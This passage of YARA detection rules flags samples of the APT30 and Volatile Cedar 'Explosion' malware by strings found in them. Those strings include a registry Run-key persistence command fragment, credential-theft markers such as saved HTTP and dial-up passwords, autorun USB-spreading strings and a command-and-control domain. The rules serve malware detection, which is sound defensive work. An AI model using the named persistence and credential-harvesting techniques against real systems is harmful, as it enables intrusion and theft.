      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:34:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "Moziea/4.0" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_17_RID2BE1 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Nkfvtyvn}]ty}ztU" fullword ascii
      $s4 = "IEXPL0RE" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule Explosion_Sample_1_RID2E23 : APT DEMO FILE T1112 T1136 {
   meta:
      description = "Explosion/Explosive Malware - Volatile Cedar APT"
      author = "Florian Roth"
      reference = "http://goo.gl/5vYaNb"
      date = "2015-04-03 11:01:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1112, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "REG ADD \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii
      $s9 = "WinAutologon From Winlogon Reg" fullword ascii
      $s10 = "82BD0E67-9FEA-4748-8672-D5EFE5B779B0" fullword ascii
      $s11 = "IE:Password-Protected sites" fullword ascii
      $s12 = "\\his.sys" fullword ascii
      $s13 = "HTTP Password" fullword ascii
      $s14 = "\\data.sys" fullword ascii
      $s15 = "EL$_RasDefaultCredentials#0" fullword wide
      $s17 = "Office Outlook HTTP" fullword ascii
      $s20 = "Hist :<b> %ws</b>  :%s </br></br>" fullword ascii
   condition: 
      all of them and uint16 ( 0 ) == 0x5A4D
} 

rule Explosion_Generic_1_RID2E7E : APT DEMO FILE GEN T1091 T1136 {
   meta:
      description = "Generic Rule for Explosion/Explosive Malware - Volatile Cedar APT - Autorun"
      author = "Florian Roth"
      reference = "not set"
      date = "2015-04-03 11:16:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, GEN, T1091, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "autorun.exe" fullword
      $s1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; MSIE 6.0; Windows NT 5.1; .NET CL" 
      $s2 = "%drp.exe" fullword
      $s3 = "%s_%s%d.exe" fullword
      $s4 = "open=autorun.exe" fullword
      $s5 = "http://www.microsoft.com/en-us/default.aspx" fullword
      $s10 = "error.renamefile" fullword
      $s12 = "insufficient lookahead" fullword
      $s13 = "%s %s|" fullword
      $s16 = ":\\autorun.exe" fullword
   condition: 
      7 of them and uint16 ( 0 ) == 0x5A4D
} 

rule APT30_Generic_H_RID2C1C : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:35:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\Temp1020.txt" fullword ascii
      $s1 = "Xmd.Txe" fullword ascii
      $s2 = "\\Internet Exp1orer" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_2_RID2BAB : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:16:21"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "ForZRLnkWordDlg.EXE" fullword wide
      $s1 = "ForZRLnkWordDlg Microsoft " fullword wide
      $s9 = "ForZRLnkWordDlg 1.0 " fullword wide
      $s11 = "ForZRLnkWordDlg" fullword wide
      $s12 = " (C) 2011" fullword wide
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_3_RID2BAC : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:16:31"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "Software\\Mic" ascii
      $s6 = "HHOSTR" ascii
      $s9 = "ThEugh" fullword ascii
      $s10 = "Moziea/" ascii
      $s12 = "%s%s(X-" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_C_RID2C17 : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:34:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "MYUSER32.dll" fullword ascii
      $s1 = "MYADVAPI32.dll" fullword ascii
      $s2 = "MYWSOCK32.dll" fullword ascii
      $s3 = "MYMSVCRT.dll" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_4_RID2BAD : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:16:41"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "GetStartupIn" ascii
      $s1 = "enMutex" ascii
      $s2 = "tpsvimi" ascii
      $s3 = "reateProcesy" ascii
      $s5 = "FreeLibr1y*S" ascii
      $s6 = "foAModuleHand" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_5_RID2BAE : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:16:51"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Version 4.7.3001" fullword wide
      $s1 = "Copyright (c) Microsoft Corporation 2004" fullword wide
      $s3 = "Microsoft(R) is a registered trademark of Microsoft Corporation in the U" wide
      $s7 = "msmsgs" fullword wide
      $s10 = "----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_7_RID2BB0 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:17:11"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "datain" fullword ascii
      $s3 = "C:\\Prog" ascii
      $s4 = "$LDDATA$" ascii
      $s5 = "Maybe a Encrypted Flash" fullword ascii
      $s6 = "Jean-loup Gailly" ascii
      $s8 = "deflate 1.1.3 Copyright" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_E_RID2C19 : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:34:41"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Nkfvtyvn}" ascii
      $s6 = "----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_8_RID2BB1 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:17:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "ateProcessA" ascii
      $s1 = "Ternel32.dllFQ" fullword ascii
      $s2 = "StartupInfoAModuleHand" fullword ascii
      $s3 = "OpenMutex" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_I_RID2C1D : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:35:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Copyright 2012 Google Inc. All rights reserved." fullword wide
      $s1 = "(Prxy%c-%s:%u)" fullword ascii
      $s2 = "Google Inc." fullword wide
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_9_RID2BB2 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:17:31"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\Windo" ascii
      $s2 = "oHHOSTR" ascii
      $s3 = "Softwa]\\Mic" ascii
      $s4 = "Startup'T" ascii
      $s6 = "Ora\\%^" ascii
      $s7 = "\\Ohttp=r" ascii
      $s17 = "help32Snapshot0L" ascii
      $s18 = "TimUmoveH" ascii
      $s20 = "WideChc[lobalAl" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_10_RID2BDA : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Version 4.7.3001" fullword wide
      $s1 = "Copyright (c) Microsoft Corporation 2004" fullword wide
      $s2 = "Microsoft(R) is a registered trademark of Microsoft Corporation in the U" wide
      $s3 = "!! Use Connect Method !!" fullword ascii
      $s4 = "(Prxy%c-%s:%u)" fullword ascii
      $s5 = "msmsgs" fullword wide
      $s18 = "(Prxy-No)" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_11_RID2BDB : APT DEMO FILE G0013 T1050 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "System\\CurrentControlSet\\control\\ComputerName\\ComputerName" fullword ascii
      $s1 = "msofscan.exe" fullword wide
      $s2 = "Mozilla/4.0 (compatible; MSIE 5.0; Win32)" fullword ascii
      $s3 = "Microsoft? is a registered trademark of Microsoft Corporation." fullword wide
      $s4 = "Windows XP Professional x64 Edition or Windows Server 2003" fullword ascii
      $s9 = "NetEagle_Scout - " fullword ascii
      $s10 = "Server 4.0, Enterprise Edition" fullword ascii
      $s11 = "Windows 3.1(Win32s)" fullword ascii
      $s12 = "%s%s%s %s" fullword ascii
      $s13 = "Server 4.0" fullword ascii
      $s15 = "Windows Millennium Edition" fullword ascii
      $s16 = "msofscan" fullword wide
      $s17 = "Eagle-Norton360-OfficeScan" fullword ascii
      $s18 = "Workstation 4.0" fullword ascii
      $s19 = "2003 Microsoft Office system" fullword wide
   condition: 
      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_12_RID2BDC : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:31"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Richic" fullword ascii
      $s1 = "Accept: image/gif, */*" fullword ascii
      $s2 = "----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d" fullword ascii
   condition: 
      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_13_RID2BDD : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "msofscan.exe" fullword wide
      $s1 = "Microsoft? is a registered trademark of Microsoft Corporation." fullword wide
      $s2 = "Microsoft Office Word Plugin Scan" fullword wide
      $s3 = "? 2006 Microsoft Corporation.  All rights reserved." fullword wide
      $s4 = "msofscan" fullword wide
      $s6 = "2003 Microsoft Office system" fullword wide
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_14_RID2BDE : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "AdobeReader.exe" fullword wide
      $s4 = "10.1.7.27" fullword wide
      $s5 = "Copyright 1984-2012 Adobe Systems Incorporated and its licensors. All ri" wide
      $s8 = "Adobe Reader" fullword wide
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_15_RID2BDF : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:01"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\Windo" ascii
      $s2 = "HHOSTR" ascii
      $s3 = "Softwa]\\Mic" ascii
      $s4 = "Startup'T" fullword ascii
      $s17 = "help32Snapshot0L" fullword ascii
      $s18 = "TimUmoveH" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_16_RID2BE0 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\Temp1020.txt" fullword ascii
      $s1 = "cmcbqyjs" fullword ascii
      $s2 = "SPVSWh\\" fullword ascii
      $s4 = "PSShxw@" fullword ascii
      $s5 = "VWhHw@" fullword ascii
      $s7 = "SVWhHw@" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_A_RID2C15 : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:34:01"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "WPVWhhiA" fullword ascii
      $s6 = "VPWVhhiA" fullword ascii
      $s11 = "VPhhiA" fullword ascii
      $s12 = "uUhXiA" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_18_RID2BE2 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:31"
      score = 95
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "w.km-nyc.com" fullword ascii
      $s1 = "tscv.exe" fullword ascii
      $s2 = "Exit/app.htm" ascii
      $s3 = "UBD:\\D" ascii
      $s4 = "LastError" ascii
      $s5 = "MicrosoftHaveAck" ascii
      $s7 = "HHOSTR" ascii
      $s20 = "XPL0RE." ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_G_RID2C1B : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:35:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "%s\\%s\\%s=%s" fullword ascii
      $s1 = "Copy File %s OK!" fullword ascii
      $s2 = "%s Space:%uM,FreeSpace:%uM" fullword ascii
      $s4 = "open=%s" fullword ascii
      $s5 = "Maybe a Encrypted Flash Disk" fullword ascii
      $s12 = "%04u-%02u-%02u %02u:%02u:%02u" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_19_RID2BE3 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "C:\\Program Files\\Common Files\\System\\wab32" fullword ascii
      $s1 = "%s,Volume:%s,Type:%s,TotalSize:%uMB,FreeSize:%uMB" fullword ascii
      $s2 = "\\TEMP\\" fullword ascii
      $s3 = "\\Temporary Internet Files\\" fullword ascii
      $s5 = "%s TotalSize:%u Bytes" fullword ascii
      $s6 = "This Disk Maybe a Encrypted Flash Disk!" fullword ascii
      $s7 = "User:%-32s" fullword ascii
      $s8 = "\\Desktop\\" fullword ascii
      $s9 = "%s.%u_%u" fullword ascii
      $s10 = "Nick:%-32s" fullword ascii
      $s11 = "E-mail:%-32s" fullword ascii
      $s13 = "%04u-%02u-%02u %02u:%02u:%02u" fullword ascii
      $s14 = "Type:%-8s" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and 8 of them
} 

rule APT30_Generic_E_v2_RID2D20 : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 10:18:31"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Nkfvtyvn}duf_Z}{Ys" fullword ascii
      $s1 = "Nkfvtyvn}*Zrswru1i" fullword ascii
      $s2 = "Nkfvtyvn}duf_Z}{V" fullword ascii
      $s3 = "Nkfvtyvn}*ZrswrumT\\b" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_20_RID2BDB : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:21"
      score = 95
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "dizhi.gif" fullword ascii
      $s2 = "Mozilla/u" ascii
      $s3 = "XicrosoftHaveAck" ascii
      $s4 = "flyeagles" ascii
      $s10 = "iexplore." ascii
      $s13 = "WindowsGV" fullword ascii
      $s16 = "CatePipe" fullword ascii
      $s17 = "'QWERTY:/webpage3" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_21_RID2BDC : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Service.dll" fullword ascii
      $s1 = "(%s:%s %s)" fullword ascii
      $s2 = "%s \"%s\",%s %s" fullword ascii
      $s5 = "Proxy-%s:%u" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_22_RID2BDD : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "(\\TEMP" fullword ascii
      $s2 = "Windows\\Cur" fullword ascii
      $s3 = "LSSAS.exeJ" fullword ascii
      $s4 = "QC:\\WINDOWS" fullword ascii
      $s5 = "System Volume" fullword ascii
      $s8 = "PROGRAM FILE" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_F_RID2C1A : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:34:51"
      score = 95
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\~zlzl.exe" fullword ascii
      $s2 = "\\Internet Exp1orer" fullword ascii
      $s3 = "NodAndKabIsExcellent" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_23_RID2BDE : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:51"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "hostid" ascii
      $s1 = "\\Window" ascii
      $s2 = "%u:%u%s" fullword ascii
      $s5 = "S2tware\\Mic" ascii
      $s6 = "la/4.0 (compa" ascii
      $s7 = "NameACKernel" fullword ascii
      $s12 = "ToWideChc[lo" fullword ascii
      $s14 = "help32SnapshotfL" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_24_RID2BDF : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:01"
      score = 95
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "dizhi.gif" fullword ascii
      $s3 = "Mozilla/4.0" fullword ascii
      $s4 = "lyeagles" fullword ascii
      $s6 = "HHOSTR" ascii
      $s7 = "#MicrosoftHaveAck7" ascii
      $s8 = "iexplore." fullword ascii
      $s17 = "ModuleH" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_25_RID2BE0 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:11"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\WINDOWS" fullword ascii
      $s2 = "aragua" fullword ascii
      $s4 = "\\driver32\\7$" fullword ascii
      $s8 = "System V" fullword ascii
      $s9 = "Compu~r" fullword ascii
      $s10 = "PROGRAM L" fullword ascii
      $s18 = "GPRTMAX" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_26_RID2BE1 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "forcegue" fullword ascii
      $s3 = "Windows\\Cur" fullword ascii
      $s4 = "System Id" fullword ascii
      $s5 = "Software\\Mic" fullword ascii
      $s6 = "utiBy0ToWideCh&$a" fullword ascii
      $s10 = "ModuleH" fullword ascii
      $s15 = "PeekNamed6G" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_D_RID2C18 : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:34:31"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
